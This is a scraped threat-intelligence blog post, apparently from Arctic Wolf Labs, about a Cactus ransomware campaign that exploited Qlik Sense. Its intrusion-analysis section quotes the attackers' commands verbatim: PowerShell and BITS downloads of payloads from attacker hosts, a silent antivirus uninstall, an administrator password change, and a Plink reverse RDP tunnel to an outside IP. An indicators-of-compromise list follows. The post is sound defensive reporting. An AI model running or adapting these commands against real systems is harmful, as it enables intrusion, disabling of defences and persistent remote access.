{
    "id": "wrong_mix_domainrange_foundationPlace_00057_2",
    "rank": 17,
    "data": {
        "url": "https://arcticwolf.com/resources/blog/qlik-sense-exploited-in-cactus-ransomware-campaign/",
        "read_more_link": "",
        "language": "en",
        "title": "Qlik Sense Exploited in Cactus Ransomware Campaign",
        "top_image": "https://arcticwolf.com/wp-content/uploads/2022/09/AW-Labs-Thumbnail-1500.jpg",
        "meta_img": "https://arcticwolf.com/wp-content/uploads/2022/09/AW-Labs-Thumbnail-1500.jpg",
        "images": [
            "https://arcticwolf.com/wp-content/uploads/2021/11/AW_LOGO_REVERSE-334.png",
            "https://arcticwolf.com/wp-content/uploads/2021/12/industry-analysis-icon-lt-blue-150-150x150.png",
            "https://arcticwolf.com/wp-content/uploads/2021/12/industry-analysis-icon-lt-blue-150-150x150.png",
            "https://arcticwolf.com/wp-content/uploads/2021/12/award-icon-lt-blue-2.png",
            "https://arcticwolf.com/wp-content/uploads/2021/12/award-icon-lt-blue-2.png",
            "https://arcticwolf.com/wp-content/uploads/2021/12/Case-study-icon-lt-blue.png",
            "https://arcticwolf.com/wp-content/uploads/2021/12/Case-study-icon-lt-blue.png",
            "https://arcticwolf.com/wp-content/uploads/2021/12/AW-service-assurance-logo-lt-blue-279x300.png",
            "https://arcticwolf.com/wp-content/uploads/2021/12/AW-service-assurance-logo-lt-blue-279x300.png",
            "https://arcticwolf.com/wp-content/uploads/2022/09/AW_Arctic_Labs_logo_icon_skyblue-150x150.png",
            "https://arcticwolf.com/wp-content/uploads/2022/09/AW_Arctic_Labs_logo_icon_skyblue-150x150.png",
            "https://arcticwolf.com/wp-content/uploads/2022/09/AW-Labs-Thumbnail-1500.jpg",
            "https://arcticwolf.com/wp-content/uploads/2022/09/AW-Labs-Thumbnail-1500.jpg",
            "https://arcticwolf.com/wp-content/uploads/2021/02/Angledlinepattern-light-bg-gray.png",
            "https://arcticwolf.com/wp-content/uploads/2021/02/Angledlinepattern-light-bg-gray.png",
            "https://arcticwolf.com/wp-content/uploads/2023/02/cropped-cropped-AW-Labs-Thumbnail-1500-2-1-300x300.jpg",
            "https://arcticwolf.com/wp-content/uploads/2023/02/cropped-cropped-AW-Labs-Thumbnail-1500-2-1-300x300.jpg",
            "https://arcticwolf.com/wp-content/uploads/2020/02/aw-blog-MDR-image-blue-04-211221.jpg",
            "https://arcticwolf.com/wp-content/uploads/2020/02/aw-blog-MDR-image-blue-04-211221.jpg",
            "https://arcticwolf.com/wp-content/uploads/2022/12/aw-blog-GOVT-image-blue-07-211221.jpg",
            "https://arcticwolf.com/wp-content/uploads/2022/12/aw-blog-GOVT-image-blue-07-211221.jpg",
            "https://arcticwolf.com/wp-content/uploads/2022/09/aw-security-bulletin-UF-Featured-Image_dots_02-220306.jpg",
            "https://arcticwolf.com/wp-content/uploads/2022/09/aw-security-bulletin-UF-Featured-Image_dots_02-220306.jpg",
            "https://arcticwolf.com/wp-content/uploads/2021/12/AW_MARK_RV-LOGO_120.png",
            "https://arcticwolf.com/wp-content/uploads/2021/12/AW_MARK_RV-LOGO_120.png"
        ],
        "movies": [],
        "keywords": [],
        "meta_keywords": [
            ""
        ],
        "tags": null,
        "authors": [
            "Stefan Hostetler, Markus Neis, Kyle Pagelow",
            "Stefan Hostetler",
            "Markus Neis",
            "Kyle Pagelow"
        ],
        "publish_date": "2023-11-28T18:41:08+00:00",
        "summary": "",
        "meta_description": "Arctic Wolf Labs has observed a new Cactus ransomware campaign which exploits publicly-exposed Qlik Sense installations.",
        "meta_lang": "en",
        "meta_favicon": "https://arcticwolf.com/wp-content/uploads/2019/11/aw-favicon-rebrand-32x32.png",
        "meta_site_name": "Arctic Wolf",
        "canonical_link": "https://arcticwolf.com/resources/blog/qlik-sense-exploited-in-cactus-ransomware-campaign/",
        "text": "This article aims to share timely and relevant information about a rapidly developing campaign under investigation. We are publishing it as early as possible for the benefit of the cybersecurity community and we will update this blog with more details as our investigation continues.\n\nKey Takeaways\n\nExploitation of Qlik Sense application in the observed campaign.\n\nCactus ransomware deployed in association with observed exploitation.\n\nManageEngine UEMS and AnyDesk deployed for remote access.\n\nMalicious activity was spawned by Qlik Sense Scheduler in each intrusion.\n\nSummary\n\nArctic Wolf Labs has observed a new Cactus ransomware campaign which exploits publicly-exposed installations of Qlik Sense, a cloud analytics and business intelligence platform.[1] Based on available evidence, we assess that all vulnerabilities exploited were previously identified by researchers from Praetorian [2,3]. For more information on these vulnerabilities, see the advisories published by Qlik (CVE-2023-41266, CVE-2023-41265, and CVE-2023-48365) as well as our Security Bulletin.\n\nThis campaign marks the first documented instance Arctic Wolf is aware of where threat actors deploying Cactus ransomware have exploited vulnerabilities in Qlik Sense for initial access.\n\nIntrusion Analysis\n\nArctic Wolf labs is currently responding to several instances of Qlik Sense exploitation for initial access.\n\nAnalysis is still ongoing, but based on research from Praetorian [2,3] and gathered forensic evidence, we currently assess that based on patch level Qlik Sense is likely being exploited either via the combination or direct abuse of CVE-2023-41266[5], CVE-2023-41265[4] or potentially CVE-2023-48365 [5] to achieve code execution.\n\nFollowing exploitation of Qlik Sense installations, the observed execution chain was consistent between all intrusions identified and involves the Qlik Sense Scheduler service (Scheduler.exe) spawning uncommon processes.\n\nCurrentDirectory”:”C:\\\\Program Files\\\\Qlik\\\\Sense\\\\Scheduler\\\\ ParentImage”:”C:\\\\Program Files\\\\Qlik\\\\Sense\\\\Scheduler\\\\Scheduler.exe CommandLine”:”C:\\\\Windows\\\\System32\\\\cmd.exe /c powershell iwr -uri http://zohoservice[.]net/putty.zip -OutFile c:\\\\windows\\\\temp\\\\putty.exe”\n\nMalicious activities involving Scheduler.exe\n\nThe threat actors leveraged PowerShell and the Background Intelligent Transfer Service (BITS) to download additional tools to establish persistence and ensure remote control, including:\n\nRenamed ManageEngine UEMS [7] executables, with a ZIP extension masquerading as Qlik files. These files were renamed again after being downloaded and invoked for silent installation\n\nAnyDesk, downloaded directly from anydesk.com [8]\n\nA Plink (PuTTY Link) binary, downloaded and renamed to putty.exe [9]\n\npowershell iwr -URI 'http://216.107.136.46/Qliksens_updated.zip' -OutFile 'C:\\Windows\\appcompat\\AcRes.exe' C:\\Windows\\appcompat\\AcRes.exe /silent powershell start-bitstransfer -source http://zohoservice.net/qlik-sens-nov.zip -outfile c:\\\\windows\\\\temp\\\\Qliksens.exe powershell Invoke-WebRequest https://download.anydesk.com/AnyDesk.exe -OutFile c:\\windows\\temp\\file.exe powershell wget 'http://zohoservice.net/anydesk.zip' -outfile 'c:\\\\windows\\\\temp\\\\any.exe' powershell iwr -uri http://zohoservice.net/putty.zip -OutFile c:\\windows\\temp\\putty.exe powershell Invoke-WebRequest https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe -OutFile C:\\\\windows\\\\temp\\\\putty.exe\n\nMultiple discovery commands were executed, and the output was redirected into .ttf files. We assume this was done to obtain the command output via the path traversal, but this assumption has yet to be verified.\n\ndir c:\\windows\\appcompat > ../Client/qmc/fonts/qle.ttf powershell Get-WmiObject -Class Win32_Product > ../Client/qmc/fonts/qle.ttf quser > ../Client/qmc/fonts/qle.ttf dir c:\\windwos\\temp > ../Client/qmc/fonts/qle.ttf\n\nThe threat actor was further observed to:\n\nUse msiexec to uninstall Sophos via its GUID\n\nChange the administrator account password\n\nEstablish an RDP tunnel via Plink\n\nMsiExec.exe /X{5C28F8A0-4BCB-4267-A869-2D589DF264F1} /qn > ../Client/qmc/fonts/qle.ttf net user administrator Linux.110.110@123 > ../Client/qmc/fonts/qle.ttf echo y \"^\"| c:\\windows\\temp\\putty.exe -ssh -P 443 -l admin -pw -R 45.61.147.176:50400:127.0.0.1:3389 45.61.147.176\n\nCactus Ransomware\n\nIn several instances, immediately following exploitation, Arctic Wolf detected malicious activities early in the kill chain and worked with customers to disrupt the progression of the attacks. We gained further insight into these activities during the investigation of a recent IR case which resulted in the deployment of Cactus ransomware.\n\nCurrent evidence revealed that the threat actors:\n\nUsed RDP for lateral movement\n\nDownloaded WizTree disk space analyzer [10]\n\nLeveraged rclone (renamed as svchost.exe) for data exfiltration\n\nBased on significant overlaps observed in all intrusions we attribute all of the described attacks to the same threat actor, which was responsible for deployment of Cactus ransomware.\n\nAs the incident response (IR) investigation is ongoing, we will provide further technical details once they become available.\n\nIndicators of Compromise\n\nIndicator Type Context 45.61.147[.]176 IP Address ManageEngine Server\n\nIP for zohoservice[.]net 216.107.136[.]46 IP Address ManageEngine Server\n\nHosting payload over HTTP 144.172.122[.]30 IP Address ManageEngine Server\n\nHosting payload over HTTP zohoservice[.]net Domain Name Hosting payload over HTTP http://zohoservice[.]net/putty.zip URL Renamed PuTTY Link (Plink) http://216.107.136[.]46/Qliksens_update.zip URL Renamed ManageEngine UEMS http://216.107.136[.]46/Qliksens_updated.zip URL Renamed ManageEngine UEMS http://zohoservice[.]net/qlik-sens-Patch.zip URL Renamed ManageEngine UEMS http://zohoservice[.]net/qlik-sens-nov.zip URL Renamed ManageEngine UEMS C:\\Users\\Public\\svchost.exe File path Renamed Rclone c:\\windows\\temp\\file.exe File path Renamed AnyDesk c:\\windows\\temp\\putty.exe File path Renamed PuTTY Link (Plink) c:\\windows\\temp\\Qliksens.exe File path Renamed ManageEngine UEMS c:\\windows\\temp\\any.exe File path Renamed AnyDesk Installer C:\\temp\\putty.exe File path Renamed PuTTY Link (Plink) C:\\Windows\\appcompat\\AcRes.exe File path Renamed ManageEngine UEMS file.exe Filename Renamed AnyDesk Installer anydesk.zip Filename Renamed AnyDesk Installer AcRes.exe Filename Renamed ManageEngine UEMS any.exe Filename Renamed AnyDesk Installer putty.zip Filename ZIP containing PuTTY Link (Plink) Qlik_sense_enterprise.zip Filename Renamed ManageEngine UEMS qlik-sens-nov.zip Filename Renamed ManageEngine UEMS qlik-sens-Patch.zip Filename Renamed ManageEngine UEMS Qliksens.exe Filename Renamed ManageEngine UEMS Qliksens_updated.zip Filename Renamed ManageEngine UEMS Qliksens_update.zip Filename Renamed ManageEngine UEMS 828e81aa16b2851561fff6d3127663ea2d1d68571f06cbd732fdf5672086924d SHA256 PuTTY Link (Plink) https://download.anydesk.com/AnyDesk.exe URL Official AnyDesk Installer 90b009b15eb1b5bc4a990ecdd86375fa25eaa67a8515ae6c6b3b58815d46fa82 SHA256 ManageEngine UEMS Installer 3ac8308a7378dfe047eacd393c861d32df34bb47535972eb0a35631ab964d14d SHA256 ManageEngine UEMS Installer 6cb87cad36f56aefcefbe754605c00ac92e640857fd7ca5faab7b9542ef80c96 SHA256 ManageEngine UEMS Installer\n\nReferences\n\n1. https://www.qlik.com/us/products/qlik-sense\n\n2. https://www.praetorian.com/blog/qlik-sense-technical-exploit/\n\n3. https://www.praetorian.com/blog/doubleqlik-bypassing-the-original-fix-for-cve-2023-41265/\n\n4. https://nvd.nist.gov/vuln/detail/CVE-2023-41265\n\n5. https://nvd.nist.gov/vuln/detail/CVE-2023-41266\n\n6. https://nvd.nist.gov/vuln/detail/CVE-2023-48365\n\n7. https://www.manageengine.com/unified-endpoint-management-security.html\n\n8. https://anydesk.com/\n\n9. https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html\n\n10. https://diskanalyzer.com/\n\nBy Stefan Hostetler, Markus Neis, Kyle Pagelow\n\nStefan Hostetler | Senior Threat Intelligence Researcher\n\nStefan is a Senior Threat Intelligence Researcher at Arctic Wolf. With over a decade of industry experience under his belt, he focuses on extracting actionable insight from novel threats to help organizations protect themselves effectively.\n\nMarkus Neis | Principal Threat Intelligence Researcher\n\nMarkus Neis is a Principal Threat Intelligence Researcher in Arctic Wolf Labs focused on leading advanced threat research. He has more than a decade of experience in researching adversary tradecraft and responding to sophisticated attacks.\n\nKyle Pagelow | Principal Forensic Analyst\n\nKyle Pagelow is a Principal Forensic Analyst at Arctic Wolf Incident Response, focused on leading complex incident response and digital forensic investigations. He holds multiple certifications and has over 10 years of operational experience in incident response, defensive cyber operations, and threat intelligence."
    }
}